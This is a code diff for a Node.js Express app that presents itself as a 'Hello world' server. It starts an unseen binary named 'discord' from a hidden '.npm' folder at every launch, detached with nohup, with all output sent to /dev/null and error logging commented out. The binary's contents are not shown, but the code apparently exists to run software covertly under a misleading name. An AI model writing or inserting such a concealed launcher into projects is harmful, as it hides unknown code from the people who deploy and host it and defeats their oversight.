@@ -3,16 +3,16 @@ const app = express();
 const fs = require('fs');
 const path = require('path');
 const { exec } = require('child_process');
-const FILE_PATH = process.env.FILE_PATH || path.join(__dirname, '.npm');
+const FILE_PATH = process.env.FILE_PATH || './.npm';
 const PORT = process.env.SERVER_PORT || process.env.PORT || 3000; 
 
 app.get("/", function(req, res) {
   res.send("Hello world!");
 });
 
-const subTxtPath = path.join(FILE_PATH, 'log.txt');
+const logTxtPath = path.join(FILE_PATH, 'log.txt');
 app.get("/log", (req, res) => {
-  fs.readFile(subTxtPath, "utf8", (err, data) => {
+  fs.readFile(logTxtPath, "utf8", (err, data) => {
     if (err) {
       console.error(err);
       res.status(500).send("Error reading log.txt");
@@ -23,35 +23,28 @@ app.get("/log", (req, res) => {
   });
 });
 
-const fileName = 'discord';
-const filePath = path.join(FILE_PATH, fileName);
-
-// Download and execute the file
 const Execute = () => {
-  try {
-    if (!fs.existsSync(filePath)) {
-      console.error(`file not found: ${filePath}`);
-      return;
+    try {
+      const command = 'nohup ./discord > /dev/null 2>&1 &';
+      const child = exec(command, { 
+        cwd: FILE_PATH,
+        shell: '/bin/bash'  
+      }, (error, stdout, stderr) => {
+        if (error) {
+          // console.error(`error: ${error}`);
+          return;
+        }
+        if (stderr) console.error(`stderr: ${stderr}`);
+      });
+  
+      child.on('exit', (code) => {
+        // console.log(`child exit code: ${code}`);
+      });
+    } catch (err) {
+      // console.error(`catch error: ${err}`);
     }
-    fs.chmodSync(filePath, '777');
-    const child = exec(`./${fileName}`, {
-      cwd: FILE_PATH 
-    }, (error, stdout, stderr) => {
-      if (error) {
-        // console.error(`error: ${error}`);
-        return;
-      }
-      if (stdout) console.log(`${stdout}`);
-      if (stderr) console.error(`stderr: ${stderr}`);
-    });
-
-    child.on('exit', (code) => {
-      // console.log(`child exit code: ${code}`);
-    });
-  } catch (err) {
-    // console.error(`catch error: ${err}`);
-  }
 };
+  
 Execute();
 
 app.listen(PORT, () => {
